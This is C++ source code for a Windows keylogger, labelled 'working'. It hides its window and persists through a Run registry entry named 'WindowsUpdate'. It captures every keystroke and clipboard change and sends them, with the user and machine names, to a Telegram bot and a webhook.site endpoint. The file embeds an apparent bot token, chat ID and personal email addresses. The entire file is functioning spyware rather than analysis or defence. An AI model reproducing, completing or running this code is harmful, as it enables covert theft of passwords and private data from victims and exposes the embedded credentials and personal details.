// ========== WORKING KEYLOGGER WITH EMAIL ==========
#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <thread>
#include <sstream>
#include <shlobj.h>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// Telegram
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// Email Webhook - YOUR WEBHOOK ID HERE
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4359-a2f4-fb7e4b2fba8d"; // ← USE THIS
const wchar_t* EMAIL_FROM = L"jesko200233@zohomail.com";
const wchar_t* EMAIL_TO = L"josephogidiagba49@gmail.com";

// Utilities
std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size, NULL, NULL);
    str.pop_back();
    return str;
}

// Telegram sender
void send_telegram(const std::wstring& message) {
    std::thread([message]() {
        HINTERNET hSession = WinHttpOpen(L"Bot/1.0", 
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME, 
                                       WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return;
        
        std::string msg = wstring_to_utf8(message);
        if (msg.size() > 3900) msg = msg.substr(0, 3900) + "...";
        
        // URL encode
        std::string encoded;
        for (char c : msg) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                encoded += c;
            } else if (c == ' ') {
                encoded += '+';
            } else {
                char buf[4];
                sprintf(buf, "%%%02X", (unsigned char)c);
                encoded += buf;
            }
        }
        
        std::string path = "/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage?chat_id=7845441585&text=" + encoded;
        std::wstring wpath(path.begin(), path.end());
        
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 443, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return;
        }
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
                                               NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }).detach();
}

// Email sender via webhook
void send_email(const std::wstring& subject, const std::wstring& body) {
    std::thread([subject, body]() {
        HINTERNET hSession = WinHttpOpen(L"Emailer/1.0",
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME,
                                       WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return;
        
        HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", 443, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return;
        }
        
        // Prepare data for webhook
        std::wstring data = L"subject=" + subject + L"&body=" + body;
        data += L"&from=jesko200233@zohomail.com";
        data += L"&to=josephogidiagba49@gmail.com";
        data += L"&timestamp=" + std::to_wstring(GetTickCount64());
        
        // Use your webhook ID in the path
        std::wstring path = L"/" + std::wstring(WEBHOOK_ID);
        std::string headers = "Content-Type: application/x-www-form-urlencoded";
        
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                               NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            WinHttpSendRequest(hRequest, headers.c_str(), headers.length(),
                              (LPVOID)data.c_str(), data.length() * sizeof(wchar_t),
                              data.length() * sizeof(wchar_t), 0);
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }).detach();
}

// Enhanced keylogger with clipboard
std::wstring keyBuffer;
HHOOK keyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        WCHAR buffer[16];
        int result = ToUnicode(pKey->vkCode, pKey->scanCode, 
                             keyboardState, buffer, 16, 0);
        
        if (result > 0) {
            keyBuffer += buffer[0];
            
            // Send every 100 characters
            if (keyBuffer.length() >= 100) {
                std::wstring temp = keyBuffer;
                keyBuffer.clear();
                
                std::wstring message = L"⌨️ Keystrokes:\n" + temp;
                send_telegram(message);
                send_email(L"Keystrokes Logged", message);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Clipboard monitor
void clipboard_monitor() {
    std::wstring lastClipboard;
    
    while (true) {
        Sleep(2000); // Check every 2 seconds
        
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* pszText = (wchar_t*)GlobalLock(hData);
                if (pszText) {
                    std::wstring currentClip(pszText);
                    if (!currentClip.empty() && currentClip != lastClipboard) {
                        lastClipboard = currentClip;
                        
                        std::wstring message = L"📋 Clipboard:\n" + currentClip;
                        send_telegram(message);
                        send_email(L"Clipboard Content", message);
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
    }
}

// Main function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                  LPSTR lpCmdLine, int nCmdShow) {
    // Hide window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Add to startup
    HKEY hKey;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, 
                      (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    // Get user and computer info
    wchar_t username[256], compname[256];
    DWORD userlen = 256, complen = 256;
    GetUserNameW(username, &userlen);
    GetComputerNameW(compname, &complen);
    
    // Send activation message to BOTH Telegram and Email
    std::wstring activationMsg = L"🚀 SMART KEYLOGGER ACTIVATED\n";
    activationMsg += L"👤 User: " + std::wstring(username) + L"\n";
    activationMsg += L"💻 Computer: " + std::wstring(compname) + L"\n";
    activationMsg += L"✅ Telegram: Working\n";
    activationMsg += L"📧 Email: Webhook ready\n";
    activationMsg += L"🕒 Time: " + std::to_wstring(GetTickCount64());
    
    send_telegram(activationMsg);
    send_email(L"Keylogger Activated", activationMsg);
    
    // Install keyboard hook
    keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    // Start clipboard monitor in background
    std::thread(clipboard_monitor).detach();
    
    // Main message loop
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    
    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
    
    return 0;
}
